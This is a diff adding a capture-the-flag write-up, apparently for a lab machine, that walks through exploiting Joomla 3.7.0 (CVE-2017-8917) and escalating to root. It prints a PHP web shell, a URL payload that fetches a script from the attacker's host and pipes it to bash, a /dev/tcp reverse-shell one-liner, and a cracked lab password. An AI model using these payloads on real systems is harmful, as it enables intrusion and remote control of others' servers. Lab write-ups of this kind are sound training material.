@@ -1,0 +1,69 @@
+1. enumeration:
+
+nmap showed ssh, http, mysql 
+
+walking the site revealed that is joomla - robots.txt containted joomla info and disallowed entries
+
+so in order to enumerate further, i needed to find out the version of joomla, which was done using:
+
+`/administrator/manifests/files/joomla.xml`
+
+this wasn’t requiring any credentials, and showed version of the software
+
+1. joomla cve 
+
+as it turned out joomla version was 3.7.0, so prone to this exploit:
+
+[https://www.exploit-db.com/exploits/42033](https://www.exploit-db.com/exploits/42033) 
+
+as sqlmap took a long time and gave me virtually nothing, i decided to look for something else and found a python script that gets the same job done a lot faster: 
+
+[https://github.com/stefanlucas/Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla)
+
+[https://github.com/SiopySh/CVE-2017-8917](https://github.com/SiopySh/CVE-2017-8917)
+
+this returned a hash and a username:
+
+**jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm**
+
+**jonah:spiderman123** 
+
+hash type was bcrypt, as i had found out on a forum (bcrypt is just used by joomla)
+
+this allowed me to log into the joomla admin website, add a template site with malicious php code:
+
+`<? php echo shell_exec($_GET[’cmd’]); ?>`
+
+that allowed me to execute commands on the system
+
+so my payload looked like this:
+
+[http://10.10.33.234/templates/protostar/rev.php?cmd=curl http://10.9.6.40:80/mla.sh | bash](http://10.10.33.234/templates/protostar/rev.php?cmd=curl%20http://10.9.6.40:80/mla.sh%20%7C%20bash)
+
+mla.sh was a file hosted on my attacking machine, which was a simple bash script:
+
+`sh -i >& /dev/tcp/10.9.6.40/9999 0>&1`
+
+piping this into bash allowed my listener to catch a reverse shell 
+
+as this wasnt really stable i generated a reverse shell using msfvenom and below resource:
+
+[https://github.com/frizb/MSF-Venom-Cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
+
+ uploaded it using python webserver and wget on target machine, set up a separate listener and executed the file giving me a much better shell 
+
+1. privilege escalation enumeration
+
+ after about 1,5h of enumerating priv esc vectors as apache user - both manually and using scripts-, it turned out that a password to the other user on the account (jjameson) was inside an apache config file under /var/www/html/ called configuration.php 
+
+this worked for SSH, and enumeration for privesc after logging in as jjameson came down to:
+
+`sudo -l`
+
+this returned sudo NOPASSWD for yum, 
+
+which quickly allowed me to get a root shell using below method
+
+[https://gtfobins.github.io/gtfobins/yum/](https://gtfobins.github.io/gtfobins/yum/)
+
+after that i was able to catch both flags and close the challenge
